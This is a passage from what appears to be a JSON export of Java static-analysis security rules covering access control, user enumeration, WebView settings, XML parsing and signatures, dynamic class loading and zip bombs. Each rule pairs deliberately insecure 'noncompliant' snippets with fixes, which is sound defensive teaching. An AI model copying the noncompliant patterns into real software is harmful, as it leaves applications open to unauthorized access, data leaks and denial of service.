vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>\n<p>To avoid running into problems with invalid certificates, consider the following sections.</p>\n<h4>Using trusted certificates</h4>\n<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list\nof trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no\nadditional code or configuration.</p>\n<h4>Working with self-signed certificates or non-standard CAs</h4>\n<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted\nroots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>\n<p>Here is a sample command to import a certificate to the Java trust store:</p>\n<pre>\nkeytool -import -alias myserver -file myserver.crt -keystore cacerts\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">Mobile Top 10 2016 Category M3 - Insecure\n  Communication</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec\n  Verification Standard - Network Communication Requirements</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/295\">CWE-295 - Improper Certificate Validation</a> </li>\n  <li> <a\n  href=\"https://wiki.sei.cmu.edu/confluence/display/java/MSC61-J.+Do+not+use+insecure+or+weak+cryptographic+algorithms\">https://wiki.sei.cmu.edu/confluence/display/java/MSC61-J.+Do+not+use+insecure+or+weak+cryptographic+algorithms</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S2658": {
        "name": "Classes should not be loaded dynamically",
        "htmlDesc": "<p>This rule is deprecated; use <a href='/coding_rules#rule_key=javasecurity%3AS6173'>S6173</a> instead.</p>\n<h2>Why is this an issue?</h2>\n<p>Dynamically loaded classes could contain malicious code executed by a static class initializer. I.E. you wouldn’t even have to instantiate or\nexplicitly invoke methods on such classes to be vulnerable to an attack.</p>\n<p>This rule raises an issue for each use of dynamic class loading.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nString className = System.getProperty(\"messageClassName\");\nClass clazz = Class.forName(className);  // Noncompliant\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/470\">CWE-470 - Use of Externally-Controlled Input to Select Classes or Code ('Unsafe\n  Reflection')</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "java:S5808": {
        "name": "Authorizations should be based on strong decisions",
        "htmlDesc": "<p>When granting users access to resources of an application, such an authorization should be based on strong decisions. For instance, a user may be\nauthorized to access a resource only if they are authenticated, or if they have the correct role and privileges.</p>\n<h2>Why is this an issue?</h2>\n<p>Access control is a critical aspect of web frameworks that ensures proper authorization and restricts access to sensitive resources or actions. To\nenable access control, web frameworks offer components that are responsible for evaluating user permissions and making access control decisions. They\nmight examine the user’s credentials, such as roles or privileges, and compare them against predefined rules or policies to determine whether the user\nshould be granted access to a specific resource or action.</p>\n<p>Conventionally, these checks should never grant access to every request received. If an endpoint or component is meant to be public, then it should\nbe ignored by access control components. Conversely, if an endpoint should deny some users from accessing it, then access control has to be configured\ncorrectly for this endpoint.</p>\n<p>Granting unrestricted access to all users can lead to security vulnerabilities and potential misuse of critical functionalities. It is important to\ncarefully assess access decisions based on factors such as user roles, resource sensitivity, and business requirements. Implementing a robust and\ngranular access control mechanism is crucial for the security and integrity of the web application itself and its surrounding environment.</p>\n<h3>What is the potential impact?</h3>\n<p>Not verifying user access strictly can introduce significant security risks. Some of the most prominent risks are listed below. Depending on the\nuse case, it is very likely that other risks are introduced on top of the ones listed.</p>\n<h4>Unauthorized access</h4>\n<p>As the access of users is not checked strictly, it becomes very easy for an attacker to gain access to restricted areas or functionalities,\npotentially compromising the confidentiality, integrity, and availability of sensitive resources. They may exploit this access to perform malicious\nactions, such as modifying or deleting data, impersonating legitimate users, or gaining administrative privileges, ultimately compromising the\nsecurity of the system.</p>\n<h4>Theft of sensitive data</h4>\n<p>Theft of sensitive data can result from incorrect access control if attackers manage to gain access to databases, file systems, or other storage\nmechanisms where sensitive data is stored. This can lead to the theft of personally identifiable information (PII), financial data, intellectual\nproperty, or other confidential information. The stolen data can be used for various malicious purposes, such as identity theft, financial fraud, or\nselling the data on the black market, causing significant harm to individuals and organizations affected by the breach.</p>\n<h2>How to fix it in Spring</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>The <code>vote</code> method of an <a\nhref=\"https://docs.spring.io/spring-security/site/docs/6.1.x/api/org/springframework/security/access/AccessDecisionVoter.html\">AccessDecisionVoter</a>\nimplementation is not compliant when it returns only an affirmative decision (<code>ACCESS_GRANTED</code>) or abstains to make a decision\n(<code>ACCESS_ABSTAIN</code>):</p>\n<pre data-diff-id=\"101\" data-diff-type=\"noncompliant\">\npublic class WeakNightVoter implements AccessDecisionVoter {\n    @Override\n    public int vote(Authentication authentication, Object object, Collection collection) {\n        Calendar calendar = Calendar.getInstance();\n        int currentHour = calendar.get(Calendar.HOUR_OF_DAY);\n\n        if (currentHour &gt;= 8 &amp;&amp; currentHour &lt;= 19) {\n            return ACCESS_GRANTED;\n        }\n\n        return ACCESS_ABSTAIN; // Noncompliant: when users connect during the night, no decision is made\n    }\n}\n</pre>\n<p>The <code>hasPermission</code> method of a <a\nhref=\"https://docs.spring.io/spring-security/site/docs/6.1.x/api/org/springframework/security/access/PermissionEvaluator.html\">PermissionEvaluator</a>\nimplementation is not compliant when it doesn’t return <code>false</code>:</p>\n<pre data-diff-id=\"102\" data-diff-type=\"noncompliant\">\npublic class MyPermissionEvaluator implements PermissionEvaluator {\n    @Override\n    public boolean hasPermission(Authentication authentication, Object targetDomainObject, Object permission) {\n        Object user = authentication.getPrincipal();\n\n        if (user.getRole().equals(permission)) {\n              return true;\n        }\n\n        return true; // Noncompliant\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>The <code>vote</code> method of an <a\nhref=\"https://docs.spring.io/spring-security/site/docs/4.0.x/apidocs/org/springframework/security/access/AccessDecisionVoter.html\">AccessDecisionVoter</a>\nimplementation should return a negative decision (<code>ACCESS_DENIED</code>):</p>\n<pre data-diff-id=\"101\" data-diff-type=\"compliant\">\npublic class StrongNightVoter implements AccessDecisionVoter {\n    @Override\n    public int vote(Authentication authentication, Object object, Collection collection) {\n        Calendar calendar = Calendar.getInstance();\n        int currentHour = calendar.get(Calendar.HOUR_OF_DAY);\n\n        if (currentHour &gt;= 8 &amp;&amp; currentHour &lt;= 19) {\n            return ACCESS_GRANTED;\n        }\n\n        return ACCESS_DENIED; // Users are not allowed to connect during the night\n    }\n}\n</pre>\n<p>The <code>hasPermission</code> method of a <a\nhref=\"https://docs.spring.io/spring-security/site/docs/4.2.13.RELEASE/apidocs/org/springframework/security/access/PermissionEvaluator.html\">PermissionEvaluator</a>\nimplementation should return <code>false</code>:</p>\n<pre data-diff-id=\"102\" data-diff-type=\"compliant\">\npublic class MyPermissionEvaluator implements PermissionEvaluator {\n    @Override\n    public boolean hasPermission(Authentication authentication, Object targetDomainObject, Object permission) {\n        Object user = authentication.getPrincipal();\n\n        if (user.getRole().equals(permission)) {\n              return true;\n        }\n\n        return false;\n    }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/285\">CWE-285 - Improper Authorization</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "java:S5804": {
        "name": "Allowing user enumeration is security-sensitive",
        "htmlDesc": "<p>User enumeration refers to the ability to guess existing usernames in a web application database. This can happen, for example, when using\n\"sign-in/sign-on/forgot password\" functionalities of a website.</p>\n<p>When an user tries to \"sign-in\" to a website with an incorrect username/login, the web application should not disclose that the username doesn’t\nexist with a message similar to \"this username is incorrect\", instead a generic message should be used like \"bad credentials\", this way it’s not\npossible to guess whether the username or password was incorrect during the authentication.</p>\n<p>If a user-management feature discloses information about the existence of a username, attackers can use brute force attacks to retrieve a large\namount of valid usernames that will impact the privacy of corresponding users and facilitate other attacks (phishing, password guessing etc …​).</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The application discloses that a username exists in its database: most of the time it’s possible to avoid this kind of leak except for the\n  \"registration/sign-on\" part of a website because in this case the user must choose a valid username (not already taken by another user). </li>\n  <li> There is no rate limiting and CAPTCHA protection in place for requests involving a username. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>When a user performs a request involving a username, it should not be possible to spot differences between a valid and incorrect username:</p>\n<ul>\n  <li> Error messages should be generic and not disclose if the username is valid or not. </li>\n  <li> The response time must be similar for a valid username or not. </li>\n  <li> CAPTCHA and other rate limiting solutions should be implemented. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>In a Spring-security web application the username leaks when:</p>\n<ul>\n  <li> The string used as argument of <a\n  href=\"https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/core/userdetails/UserDetailsService.html\">loadUserByUsername</a> method is used in an exception message: </li>\n</ul>\n<pre>\npublic String authenticate(String username, String password) {\n  // ....\n  MyUserDetailsService s1 = new MyUserDetailsService();\n  MyUserPrincipal u1 = s1.loadUserByUsername(username);\n\n  if(u1 == null) {\n    throw new BadCredentialsException(username+\" doesn't exist in our database\"); // Sensitive\n  }\n  // ....\n}\n</pre>\n<ul>\n  <li> <a\n  href=\"https://docs.spring.io/spring-security/site/docs/3.0.x/apidocs/org/springframework/security/core/userdetails/UsernameNotFoundException.html\">UsernameNotFoundException</a> is thrown (except when it is in the loadUserByUsername method): </li>\n</ul>\n<pre>\npublic String authenticate(String username, String password) {\n  // ....\n  if(user == null) {\n      throw new UsernameNotFoundException(\"user not found\"); // Sensitive\n  }\n  // ....\n}\n</pre>\n<ul>\n  <li> <a\n  href=\"https://docs.spring.io/spring-security/site/docs/4.0.x/apidocs/org/springframework/security/authentication/dao/AbstractUserDetailsAuthenticationProvider.html#setHideUserNotFoundExceptions-boolean-\">HideUserNotFoundExceptions</a> is set to false: </li>\n</ul>\n<pre>\nDaoAuthenticationProvider daoauth = new DaoAuthenticationProvider();\ndaoauth.setUserDetailsService(new MyUserDetailsService());\ndaoauth.setPasswordEncoder(new BCryptPasswordEncoder());\ndaoauth.setHideUserNotFoundExceptions(false); // Sensitive\nbuilder.authenticationProvider(daoauth);\n</pre>\n<h2>Compliant Solution</h2>\n<p>In a Spring-security web application:</p>\n<ul>\n  <li> the same message should be used regardless of whether it is the wrong user or password: </li>\n</ul>\n<pre>\npublic String authenticate(String username, String password) throws AuthenticationException {\n  Details user = null;\n  try {\n    user = loadUserByUsername(username);\n  } catch (UsernameNotFoundException | DataAccessException e) {\n    // Hide this exception reason to not disclose that the username doesn't exist\n  }\n  if (user == null || !user.isPasswordCorrect(password)) {\n     // User should not be able to guess if the bad credentials message is related to the username or the password\n    throw new BadCredentialsException(\"Bad credentials\");\n  }\n}\n</pre>\n<ul>\n  <li> <a\n  href=\"https://docs.spring.io/spring-security/site/docs/4.0.x/apidocs/org/springframework/security/authentication/dao/AbstractUserDetailsAuthenticationProvider.html#setHideUserNotFoundExceptions-boolean-\">HideUserNotFoundExceptions</a> should be set to true: </li>\n</ul>\n<pre>\nDaoAuthenticationProvider daoauth = new DaoAuthenticationProvider();\ndaoauth.setUserDetailsService(new MyUserDetailsService());\ndaoauth.setPasswordEncoder(new BCryptPasswordEncoder());\ndaoauth.setHideUserNotFoundExceptions(true); // Compliant\nbuilder.authenticationProvider(daoauth);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/200\">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "java:S6362": {
        "name": "Enabling JavaScript support for WebViews is security-sensitive",
        "htmlDesc": "<p>WebViews can be used to display web content as part of a mobile application. A browser engine is used to render and display the content. Like a web\napplication, a mobile application that uses WebViews can be vulnerable to Cross-Site Scripting if untrusted code is rendered. In the context of a\nWebView, JavaScript code can exfiltrate local files that might be sensitive or even worse, access exposed functions of the application that can result\nin more severe vulnerabilities such as code injection. Thus JavaScript support should not be enabled for WebViews unless it is absolutely necessary\nand the authenticity of the web resources can be guaranteed.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The WebWiew only renders static web content that does not require JavaScript code to be executed. </li>\n  <li> The WebView contains untrusted data that could cause harm when rendered. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It is recommended to disable JavaScript support for WebViews unless it is necessary to execute JavaScript code. Only trusted pages should be\nrendered.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nimport android.webkit.WebView;\n\nWebView webView = (WebView) findViewById(R.id.webview);\nwebView.getSettings().setJavaScriptEnabled(true); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport android.webkit.WebView;\n\nWebView webView = (WebView) findViewById(R.id.webview);\nwebView.getSettings().setJavaScriptEnabled(false);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting')</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "java:S6363": {
        "name": "Enabling file access for WebViews is security-sensitive",
        "htmlDesc": "<p>WebViews can be used to display web content as part of a mobile application. A browser engine is used to render and display the content. Like a web\napplication, a mobile application that uses WebViews can be vulnerable to Cross-Site Scripting if untrusted code is rendered.</p>\n<p>If malicious JavaScript code in a WebView is executed this can leak the contents of sensitive files when access to local files is enabled.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> No local files have to be accessed by the Webview. </li>\n  <li> The WebView contains untrusted data that could cause harm when rendered. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It is recommended to disable access to local files for WebViews unless it is necessary. In the case of a successful attack through a Cross-Site\nScripting vulnerability the attackers attack surface decreases drastically if no files can be read out.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nimport android.webkit.WebView;\n\nWebView webView = (WebView) findViewById(R.id.webview);\nwebView.getSettings().setAllowFileAccess(true); // Sensitive\nwebView.getSettings().setAllowContentAccess(true); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport android.webkit.WebView;\n\nWebView webView = (WebView) findViewById(R.id.webview);\nwebView.getSettings().setAllowFileAccess(false);\nwebView.getSettings().setAllowContentAccess(false);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting')</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "java:S6374": {
        "name": "XML parsers should not load external schemas",
        "htmlDesc": "<p>This rule is deprecated; use <a href='/coding_rules#rule_key=java%3AS2755'>S2755</a> instead.</p>\n<h2>Why is this an issue?</h2>\n<p>By default XML processors attempt to load all XML schemas and DTD (their locations are defined with <code>xsi:schemaLocation</code> attributes and\n<code>DOCTYPE</code> declarations), potentially from an external storage such as file system or network, which may lead, if no restrictions are put in\nplace, to <a href=\"https://owasp.org/www-community/attacks/Server_Side_Request_Forgery\">server-side request forgery (SSRF)</a> vulnerabilities.</p>\n<h3>Noncompliant code example</h3>\n<p>For <a href=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/DocumentBuilderFactory.html\">DocumentBuilder</a>, <a\nhref=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/SAXParserFactory.html\">SAXParser</a> and <a\nhref=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/SchemaFactory.html\">Schema</a> JAPX factories:</p>\n<pre>\nDocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setValidating(true); // Noncompliant\nfactory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", true); // Noncompliant\n\nSAXParserFactory factory = SAXParserFactory.newInstance();\nfactory.setValidating(true); // Noncompliant\nfactory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", true); // Noncompliant\n\nSchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);\nschemaFactory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", true); // Noncompliant\n</pre>\n<p>For <a href=\"https://dom4j.github.io/\">Dom4j</a> library:</p>\n<pre>\nSAXReader xmlReader = new SAXReader(); // Noncompliant\nxmlReader.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", true);  // Noncompliant\n</pre>\n<p>For <a href=\"http://www.jdom.org/\">Jdom2</a> library:</p>\n<pre>\nSAXBuilder builder = new SAXBuilder();\nbuilder.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", true); // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<p>For <a href=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/DocumentBuilderFactory.html\">DocumentBuilder</a>, <a\nhref=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/SAXParserFactory.html\">SAXParser</a> and <a\nhref=\"https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/SchemaFactory.html\">Schema</a> JAPX factories:</p>\n<pre>\nDocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);\n\nSAXParserFactory factory = SAXParserFactory.newInstance();\nfactory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);\n\nSchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);\nschemaFactory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);\n</pre>\n<p>For <a href=\"https://dom4j.github.io/\">Dom4j</a> library:</p>\n<pre>\nSAXReader xmlReader = new SAXReader(); // Noncompliant\nxmlReader.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);\n</pre>\n<p>For <a href=\"http://www.jdom.org/\">Jdom2</a> library:</p>\n<pre>\nSAXBuilder builder = new SAXBuilder();\nbuilder.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);\n</pre>\n<h3>Exceptions</h3>\n<p>This rules does not raise an issue when an <code>EntityResolver</code> is set.</p>\n<pre>\nDocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setValidating(true);\nDocumentBuilder builder = factory.newDocumentBuilder();\nbuilder.setEntityResolver(new MyEntityResolver());\n\nSAXBuilder builder = new SAXBuilder();\nbuilder.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", true);\nbuilder.setEntityResolver(new EntityResolver());\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a\n  href=\"https://docs.oracle.com/en/java/javase/13/security/java-api-xml-processing-jaxp-security-guide.html#GUID-8CD65EF5-D113-4D5C-A564-B875C8625FAC\">Oracle Java Documentation</a> - XML External Entity Injection Attack </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)\">Top 10 2017 Category A4 - XML External\n  Entities (XXE)</a> </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java\">OWASP XXE Prevention Cheat\n  Sheet</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/611\">CWE-611 - Information Exposure Through XML External Entity Reference</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/827\">CWE-827 - Improper Control of Document Type Definition</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "java:S6377": {
        "name": "XML signatures should be validated securely",
        "htmlDesc": "<p>XML signatures are a method used to ensure the integrity and authenticity of XML documents. However, if XML signatures are not validated securely,\nit can lead to potential vulnerabilities.</p>\n<h2>Why is this an issue?</h2>\n<p>Before Java 17, XML Digital Signature API does not apply restrictions on XML signature validation unless the application runs with a security\nmanager, which is rare.</p>\n<h2>What is the potential impact</h2>\n<p>By not enforcing secure validation, the XML Digital Signature API is more susceptible to attacks such as signature spoofing and injections.</p>\n<h3>Increased Vulnerability to Signature Spoofing</h3>\n<p>By disabling secure validation, the application becomes more susceptible to signature spoofing attacks. Attackers can potentially manipulate the\nXML signature in a way that bypasses the validation process, allowing them to forge or tamper with the signature. This can lead to the acceptance of\ninvalid or maliciously modified signatures, compromising the integrity and authenticity of the XML documents.</p>\n<h3>Risk of Injection Attacks</h3>\n<p>Disabling secure validation can expose the application to injection attacks. Attackers can inject malicious code or entities into the XML document,\ntaking advantage of the weakened validation process. In some cases, it can also expose the application to denial-of-service attacks. Attackers can\nexploit vulnerabilities in the validation process to cause excessive resource consumption or system crashes, leading to service unavailability or\ndisruption.</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>For versions of Java before 17, secure validation is disabled by default unless the application runs with a security manager, which is rare. It\nshould be enabled explicitly by setting the <code>org.jcp.xml.dsig.secureValidation</code> attribute to true with the\n<code>javax.xml.crypto.dsig.dom.DOMValidateContext.setProperty</code> method.</p>\n<p>For Java 17 and higher, secure validation is enabled by default.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nNodeList signatureElement = doc.getElementsByTagNameNS(XMLSignature.XMLNS, \"Signature\");\n\nXMLSignatureFactory fac = XMLSignatureFactory.getInstance(\"DOM\");\nDOMValidateContext valContext = new DOMValidateContext(new KeyValueKeySelector(), signatureElement.item(0)); // Noncompliant\nXMLSignature signature = fac.unmarshalXMLSignature(valContext);\n\nboolean signatureValidity = signature.validate(valContext);\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nNodeList signatureElement = doc.getElementsByTagNameNS(XMLSignature.XMLNS, \"Signature\");\n\nXMLSignatureFactory fac = XMLSignatureFactory.getInstance(\"DOM\");\nDOMValidateContext valContext = new DOMValidateContext(new KeyValueKeySelector(), signatureElement.item(0));\nvalContext.setProperty(\"org.jcp.xml.dsig.secureValidation\", Boolean.TRUE);\nXMLSignature signature = fac.unmarshalXMLSignature(valContext);\n\nboolean signatureValidity = signature.validate(valContext);\n</pre>\n<h3>How does this work?</h3>\n<p>When XML Signature secure validation mode is enabled, XML Signatures are processed more securely. It enforces a number of restrictionsto to protect\nfrom XML Documents that may contain hostile constructs that can cause denial-of-service or other types of security issues.</p>\n<p>These restrictions can protect you from XML Signatures that may contain potentially hostile constructs that can cause denial-of-service or other\ntypes of security issues.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Oracle Java Documentation - <a\n  href=\"https://docs.oracle.com/en/java/javase/21/security/java-xml-digital-signature-api-overview-and-tutorial.html\">XML Digital Signature API\n  Overview and Tutorial</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10:2021 A02:2021 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/347\">CWE-347 - Improper Verification of Cryptographic Signature</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "java:S5042": {
        "name": "Expanding archive files without controlling resource consumption is security-sensitive",
        "htmlDesc": "<p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can\nlead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of\nuncompressed data. To achieve this extreme <a href=\"https://en.wikipedia.org/wiki/Data_compression_ratio\">compression ratio</a>, attackers will\ncompress irrelevant data (eg: a long string of repeated bytes).</p>\n<h2>Ask Yourself Whether</h2>\n<p>Archives to expand are untrusted and:</p>\n<ul>\n  <li> There is no validation of the number of entries in the archive. </li>\n  <li> There is no validation of the total size of the uncompressed data. </li>\n  <li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Define and control the ratio between compressed and uncompressed data, in general the data compression ratio for most of the legit archives is\n  1 to 3. </li>\n  <li> Define and control the threshold for maximum total size of the uncompressed data. </li>\n  <li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in\n  particular it’s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nFile f = new File(\"ZipBomb.zip\");\nZipFile zipFile = new ZipFile(f);\nEnumeration&lt;? extends ZipEntry&gt; entries = zipFile.entries(); // Sensitive\n\nwhile(entries.hasMoreElements()) {\n  ZipEntry ze = entries.nextElement();\n  File out = new File(\"./output_onlyfortesting.txt\");\n  Files.copy(zipFile.getInputStream(ze), out.toPath(), StandardCopyOption.REPLACE_EXISTING);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>Do not rely on <a href=\"https://docs.oracle.com/javase/7/docs/api/java/util/zip/ZipEntry.html#getSize()\">getsize</a> to retrieve the size of an\nuncompressed entry because this method returns what is defined in the archive headers which can be forged by attackers, instead calculate the actual\nentry size when unzipping it:</p>\n<pre>\nFile f = new File(\"ZipBomb.zip\");\nZipFile zipFile = new ZipFile(f);\nEnumeration&lt;? extends ZipEntry&gt; entries = zipFile.entries();\n\nint THRESHOLD_ENTRIES = 10000;\nint THRESHOLD_SIZE = 1000000000; // 1 GB\ndouble THRESHOLD_RATIO = 10;\nint totalSizeArchive = 0;\nint totalEntryArchive = 0;\n\nwhile(entries.hasMoreElements()) {\n  ZipEntry ze = entries.nextElement();\n  InputStream in = new BufferedInputStream(zipFile.getInputStream(ze));\n  OutputStream out = new BufferedOutputStream(new FileOutputStream(\"./output_onlyfortesting.txt\"));\n\n  totalEntryArchive ++;\n\n  int nBytes = -1;\n  byte[] buffer = new byte[2048];\n  int totalSizeEntry = 0;\n\n  while((nBytes = in.read(buffer)) &gt; 0) { // Compliant\n      out.write(buffer, 0, nBytes);\n      totalSizeEntry += nBytes;\n      totalSizeArchive += nBytes;\n\n      double compressionRatio = totalSizeEntry / ze.getCompressedSize();\n      if(compressionRatio &gt; THRESHOLD_RATIO) {\n        // ratio between compressed and uncompressed data is highly suspicious, looks like a Zip Bomb Attack\n        break;\n      }\n  }\n\n  if(totalSizeArchive &gt; THRESHOLD_SIZE) {\n      // the uncompressed data size is too much for the application resource capacity\n      break;\n  }\n\n  if(totalEntryArchive &gt; THRESHOLD_ENTRIES) {\n      // too much entries in this archive, can lead to inodes exhaustion of the system\n      break;\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a 